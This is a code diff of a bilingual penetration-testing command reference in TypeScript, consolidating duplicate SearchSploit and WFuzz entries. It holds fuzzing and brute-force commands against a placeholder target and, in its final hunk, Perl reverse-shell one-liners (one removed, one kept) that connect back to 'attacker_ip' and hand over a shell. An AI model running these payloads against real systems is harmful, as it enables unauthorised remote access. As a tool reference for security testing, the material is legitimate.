@@ -1287,38 +1287,6 @@ export const toolCommands: ToolCommand[] = [
     references: ['https://github.com/PowerShellMafia/PowerSploit']
   },
   {
-    id: 'searchsploit-tool',
-    name: 'SearchSploit',
-    description: { zh: '漏洞搜索工具', en: 'Vulnerability search tool' },
-    category: { zh: '信息收集', en: 'Information Gathering' },
-    installation: 'apt install exploitdb',
-    commands: [
-      { name: { zh: '搜索漏洞', en: 'Search Exploits' }, command: 'searchsploit apache 2.4', description: { zh: '搜索Apache漏洞', en: 'Search for Apache vulnerabilities' }, platform: 'linux' },
-      { name: { zh: '精确搜索', en: 'Exact Search' }, command: 'searchsploit -e "Apache 2.4"', description: { zh: '精确匹配搜索', en: 'Exact match search' }, platform: 'linux' },
-      { name: { zh: '排除结果', en: 'Exclude Results' }, command: 'searchsploit apache --exclude="DoS"', description: { zh: '排除特定类型', en: 'Exclude specific type' }, platform: 'linux' },
-      { name: { zh: '查看漏洞', en: 'View Exploit' }, command: 'searchsploit -x exploits/xxx.py', description: { zh: '查看漏洞代码', en: 'View exploit code' }, platform: 'linux' },
-      { name: { zh: '复制漏洞', en: 'Copy Exploit' }, command: 'searchsploit -m exploits/xxx.py', description: { zh: '复制到当前目录', en: 'Copy to current directory' }, platform: 'linux' },
-      { name: { zh: '更新数据库', en: 'Update Database' }, command: 'searchsploit -u', description: { zh: '更新漏洞数据库', en: 'Update vulnerability database' }, platform: 'linux' }
-    ],
-    references: ['https://www.exploit-db.com/']
-  },
-  {
-    id: 'wfuzz-tool',
-    name: 'WFuzz',
-    description: { zh: 'Web模糊测试工具', en: 'Web fuzzing tool' },
-    category: { zh: 'Web渗透', en: 'Web Penetration' },
-    installation: 'pip install wfuzz',
-    commands: [
-      { name: { zh: '目录爆破', en: 'Directory Brute Force' }, command: 'wfuzz -c -w wordlist.txt http://target.com/FUZZ', description: { zh: '基础目录爆破', en: 'Basic directory brute force' }, platform: 'linux' },
-      { name: { zh: '过滤响应', en: 'Filter Response' }, command: 'wfuzz -c -w wordlist.txt --hc 404 http://target.com/FUZZ', description: { zh: '过滤404响应', en: 'Filter 404 responses' }, platform: 'linux' },
-      { name: { zh: 'POST测试', en: 'POST Test' }, command: 'wfuzz -c -w wordlist.txt -d "user=FUZZ&pass=test" http://target.com/login', description: { zh: 'POST数据测试', en: 'POST data fuzzing' }, platform: 'linux' },
-      { name: { zh: 'Cookie测试', en: 'Cookie Test' }, command: 'wfuzz -c -w wordlist.txt -b "session=FUZZ" http://target.com/', description: { zh: 'Cookie模糊测试', en: 'Cookie fuzzing' }, platform: 'linux' },
-      { name: { zh: 'Header测试', en: 'Header Test' }, command: 'wfuzz -c -w wordlist.txt -H "Host: FUZZ.target.com" http://target.com/', description: { zh: 'Host头测试', en: 'Host header fuzzing' }, platform: 'linux' },
-      { name: { zh: '递归扫描', en: 'Recursive Scan' }, command: 'wfuzz -c -w wordlist.txt -R 2 http://target.com/FUZZ', description: { zh: '递归扫描', en: 'Recursive Scan' }, platform: 'linux' }
-    ],
-    references: ['https://github.com/xmendez/wfuzz']
-  },
-  {
     id: 'dirsearch',
     name: 'Dirsearch',
     description: { zh: '高级Web目录和文件暴力破解工具', en: 'Advanced web directory and file brute force tool' },
@@ -1875,7 +1843,10 @@ export const toolCommands: ToolCommand[] = [
         command: 'wfuzz -c -z file,subs.txt --hc 404 -H "Host: FUZZ.target.com" https://target.com',
         description: { zh: 'Host头注入方式枚举子域名', en: 'Enumerate subdomains via Host header injection' },
         platform: 'all'
-      }
+      },
+      { name: { zh: '字典目录爆破', en: 'Wordlist Directory Brute Force' }, command: 'wfuzz -c -w wordlist.txt http://target.com/FUZZ', description: { zh: '使用-w指定字典的基础目录爆破', en: 'Basic directory brute force with -w wordlist' }, platform: 'all' },
+      { name: { zh: 'Cookie测试', en: 'Cookie Test' }, command: 'wfuzz -c -w wordlist.txt -b "session=FUZZ" http://target.com/', description: { zh: '对Cookie值进行模糊测试', en: 'Cookie fuzzing' }, platform: 'all' },
+      { name: { zh: '递归扫描', en: 'Recursive Scan' }, command: 'wfuzz -c -w wordlist.txt -R 2 http://target.com/FUZZ', description: { zh: '对发现的目录递归扫描2层深度', en: 'Recursively scan discovered directories to depth 2' }, platform: 'all' }
     ],
     references: ['https://github.com/xmendez/wfuzz']
   },
@@ -2189,7 +2160,9 @@ export const toolCommands: ToolCommand[] = [
         command: 'searchsploit -j apache | jq ".RESULTS_EXPLOIT[]"',
         description: { zh: 'JSON格式输出便于脚本处理', en: 'JSON format output for script processing' },
         platform: 'all'
-      }
+      },
+      { name: { zh: '查看漏洞代码', en: 'View Exploit Code' }, command: 'searchsploit -x exploits/xxx.py', description: { zh: '直接查看指定利用代码内容', en: 'View the full source code of a specific exploit file directly in the terminal' }, platform: 'all' },
+      { name: { zh: '更新数据库', en: 'Update Database' }, command: 'searchsploit -u', description: { zh: '更新本地Exploit-DB数据库', en: 'Update the local Exploit-DB database' }, platform: 'all' }
     ],
     references: ['https://www.exploit-db.com/searchsploit']
   },
@@ -3372,7 +3345,6 @@ export const toolCommands: ToolCommand[] = [
         description: { zh: 'Perl IO模块方式', en: 'Perl IOModuleMethod' },
         platform: 'linux'
       },
-      { name: { zh: 'Perl 一行命令', en: 'Perl one-liner' }, command: 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attacker_ip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'', description: { zh: 'Perl IO socket 反弹 Shell', en: 'Perl IO socket reverse shell' }, platform: 'linux' },
       { name: { zh: 'Windows Perl', en: 'Windows Perl reverse' }, command: 'perl -e \'use Socket;$i="attacker_ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("cmd.exe");\'', description: { zh: 'Windows Perl 反弹 cmd', en: 'Perl reverse shell on Windows' }, platform: 'windows' },
     ],
     references: ['https://www.revshells.com/']
